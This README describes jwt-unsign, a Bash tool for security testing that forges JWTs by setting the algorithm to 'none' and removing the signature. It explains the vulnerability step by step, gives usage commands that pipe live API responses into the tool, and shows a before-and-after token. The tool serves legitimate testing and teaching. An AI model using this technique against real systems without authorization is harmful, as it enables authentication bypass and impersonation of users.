# JWT Utilities

A collection of utilities for working with JSON Web Tokens (JWTs), primarily focused on security testing and vulnerability assessment.

## Tools

### [jwt-unsign](jwt-unsign)

A Bash script that exploits the JWT "none" algorithm vulnerability by modifying JWTs found in input streams.

#### What it does

- Searches for JSON Web Tokens in stdin
- Replaces the algorithm (`alg`) value with `"none"`
- Removes the signature component
- Outputs the modified unsigned JWT

#### The Vulnerability

Some JWT implementations accept tokens with `alg` set to `"none"`, which means the token has no signature verification. This allows an attacker to forge tokens by:

1. Taking a valid JWT
2. Modifying the payload (claims)
3. Setting the algorithm to "none"
4. Removing the signature

If the application doesn't properly validate that signatures are required, it will accept the forged token.

#### Installation

```bash
# Clone the repository
git clone https://github.com/yourusername/jwt-utils.git
cd jwt-utils

# Make the script executable
chmod +x jwt-unsign

# Optionally, add to your PATH
sudo ln -s $(pwd)/jwt-unsign /usr/local/bin/jwt-unsign
```

#### Usage

```bash
# Basic usage - pipe text containing JWTs
echo "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c" | jwt-unsign

# Process a file containing JWTs
cat response.txt | jwt-unsign

# Use with curl to test web applications
curl https://api.example.com/user | jwt-unsign

# Use with burp suite or other proxy tools
cat burp-output.txt | jwt-unsign > modified.txt
```

#### Example

Input:

```yaml
token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

Output:

```yaml
token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.
```

The modified token has:

- Header changed from `{"alg":"HS256","typ":"JWT"}` to `{"alg":"none","typ":"JWT"}`
- Payload remains unchanged: `{"sub":"1234567890","name":"John Doe","iat":1516239022}`
- Signature removed (note the trailing period)

#### Security Note

This tool is intended for **authorized security testing only**. Use it responsibly and only on:

- Systems you own
- Systems you have explicit written permission to test
- CTF (Capture The Flag) competitions
- Educational/learning environments

Unauthorized access to computer systems is illegal.

## Contributing

See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines on how to contribute to this project.

## License

See [LICENSE](LICENSE) for license information.

## Security

See [SECURITY.md](SECURITY.md) for information about reporting security vulnerabilities.

## Code of Conduct

Please read [CODE_OF_CONDUCT.md](CODE_OF_CONDUCT.md) for details on our code of conduct.
